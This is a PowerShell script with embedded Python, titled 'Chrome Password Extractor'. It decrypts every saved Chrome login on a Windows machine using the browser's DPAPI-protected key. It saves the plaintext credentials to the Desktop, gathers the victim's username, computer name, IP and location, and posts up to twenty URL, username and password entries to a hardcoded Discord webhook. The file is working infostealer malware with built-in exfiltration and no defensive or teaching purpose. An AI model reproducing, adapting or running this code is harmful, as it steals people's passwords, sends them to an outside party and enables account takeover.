# Chrome Password Extractor - Using Python for Decryption

Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
Write-Host ""

# Create Python decryption script
$pythonScript = @'
import sys
import json
import base64
import sqlite3
import shutil
import os
from Crypto.Cipher import AES

# Get key
local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
with open(local_state, "r", encoding="utf-8") as f:
    state = json.loads(f.read())

encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]

import win32crypt
key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Copy database
db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
temp_db = os.path.join(os.environ["TEMP"], "chrome_temp.db")
shutil.copyfile(db_path, temp_db)

# Query
conn = sqlite3.connect(temp_db)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

results = []
for row in cursor.fetchall():
    url, username, enc_pass = row
    
    if not enc_pass:
        continue
    
    # Decrypt
    try:
        if enc_pass[:3] == b'v10' or enc_pass[:3] == b'v20':
            # AES-GCM
            nonce = enc_pass[3:15]
            ciphertext = enc_pass[15:-16]
            tag = enc_pass[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            password = cipher.decrypt_and_verify(ciphertext, tag).decode()
        else:
            # Old DPAPI
            password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode()
        
        results.append({
            "url": url,
            "username": username,
            "password": password
        })
    except Exception as e:
        pass

cursor.close()
conn.close()
os.remove(temp_db)

# Output as JSON
print(json.dumps(results, indent=2))
'@

$scriptPath = "$env:TEMP\decrypt_chrome.py"
$pythonScript | Out-File $scriptPath -Encoding UTF8

Write-Host "Installing Python dependencies..." -ForegroundColor Yellow
python -m pip install pycryptodome pywin32 --quiet 2>&1 | Out-Null

Write-Host "Running Python decryptor..." -ForegroundColor Yellow
Write-Host ""

$output = python $scriptPath 2>&1 | Out-String

if ($output -match "Traceback") {
    Write-Host "Python error:" -ForegroundColor Red
    Write-Host $output
    Remove-Item $scriptPath
    Read-Host "Press Enter to exit"
    exit
}

# Parse results
try {
    $passwords = $output | ConvertFrom-Json
    
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "Successfully extracted $($passwords.Count) passwords!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    
    foreach ($p in $passwords) {
        Write-Host "URL: $($p.url)" -ForegroundColor Cyan
        Write-Host "  Username: $($p.username)" -ForegroundColor White
        Write-Host "  Password: $($p.password)" -ForegroundColor Green
        Write-Host ""
    }
    
    # Save to file
    $outFile = "$env:USERPROFILE\Desktop\chrome_passwords.txt"
    $passwords | ConvertTo-Json | Out-File $outFile
    Write-Host "Saved to: $outFile" -ForegroundColor Cyan
    
    # Send to Discord
    Write-Host ""
    Write-Host "Sending to Discord..." -ForegroundColor Yellow
    
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
        $ip = $ipInfo.query
        $city = $ipInfo.city
        $country = $ipInfo.country
    } catch {
        $ip = "Unknown"
        $city = "Unknown"
        $country = "Unknown"
    }
    
    $passText = ""
    $max = [Math]::Min($passwords.Count, 20)
    
    for ($i = 0; $i -lt $max; $i++) {
        $p = $passwords[$i]
        $passText += "`n**$($p.url)**`nUser: ``$($p.username)```nPass: ``$($p.password)```n"
    }
    
    if ($passwords.Count -gt 20) {
        $passText += "`n... +$($passwords.Count - 20) more"
    }
    
    $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:globe_with_meridians: $ip - $city, $country

**🔐 Chrome Passwords ($($passwords.Count)):**$passText
"@
    
    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
    
    if ($message.Length -gt 1900) {
        $message = $message.Substring(0, 1900)
    }
    
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
    Write-Host "Sent to Discord!" -ForegroundColor Green
    
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}

Remove-Item $scriptPath
Write-Host ""
Read-Host "Press Enter to exit"
